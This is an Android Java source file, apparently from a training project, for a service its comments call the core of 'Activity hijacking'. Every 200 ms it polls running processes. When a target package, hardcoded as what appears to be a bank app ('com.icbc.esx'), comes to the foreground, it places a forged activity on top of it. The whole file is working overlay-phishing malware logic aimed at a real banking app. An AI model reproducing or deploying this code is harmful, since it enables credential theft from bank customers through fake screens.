package com.itheima.service;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import com.itheima.app.SmpApplication;
import com.itheima.ui.PaletteViewActivity;

import java.util.HashMap;
import java.util.List;

/**
 * @Subject Activity劫持核心服务
 * @Author  zhangming
 * @Date    2020-12-19 12:34
 */
public class HijackService extends Service {
    //targetMap用于存放我们的目标程序
    private HashMap<String, Class<?>> targetMap = new HashMap<String, Class<?>>();
    private Handler handler = new Handler();
    private boolean isStart = false;

    //我们新建一个Runnable对象,每隔200ms进行一次搜索
    private Runnable searchTarget = new Runnable() {
        @Override
        public void run() {
            //得到ActivityManager
            ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            //通过ActivityManager将当前正在运行的进程存入processInfo中
            List<ActivityManager.RunningAppProcessInfo> processInfo = activityManager.getRunningAppProcesses();
            //遍历processInfo中的进程信息,看是否有我们的目标
            for (ActivityManager.RunningAppProcessInfo _processInfo : processInfo) {
                //若processInfo中的进程正在前台且是我们的目标进程,则调用hijack方法进行劫持
                if (_processInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                    if (targetMap.containsKey(_processInfo.processName)) {
                        //调用hijack方法进行劫持
                        hijack(_processInfo.processName);
                    } else {
                        Log.w("zhangming", "processName进程:"+_processInfo.processName);
                    }
                }
            }
            handler.postDelayed(searchTarget, 200);
        }
    };

    //进行Activity劫持的函数
    private  void hijack(String processName) {
        //这里判断我们的目标程序是否已经被劫持过了
        if (!(((SmpApplication) getApplication()).hasProgressBeHijacked(processName))) {
            Log.w("zhangming", "开始劫持"+processName);
            Intent intent = new Intent(getBaseContext(), targetMap.get(processName));
            //这里必须将flag设置为Intent.FLAG_ACTIVITY_NEW_TASK，这样才能将我们伪造的Activity至于栈顶
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            //启动我们伪造的Activity
            getApplication().startActivity(intent);
            //将目标程序加入到已劫持列表中
            ((SmpApplication) getApplication()).addHijacked(processName);
            Log.w("zhangming", "已经劫持");
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isStart) {
            //将我们的目标加入targetMap中
            //这里key为我们的目标进程,value为我们伪造的Activity
            targetMap.put("com.icbc.esx", PaletteViewActivity.class);
            //启动searchTarget Task Runnable
            handler.postDelayed(searchTarget, 1000);
            isStart = true;
            Log.i("zhangming","HijackService onStartCommand...");
        }
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public boolean stopService(Intent name) {
        isStart = false;
        Log.w("zhangming", "劫持服务停止");
        ((SmpApplication) getApplication()).clearHijacked();
        handler.removeCallbacks(searchTarget);
        return super.stopService(name);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
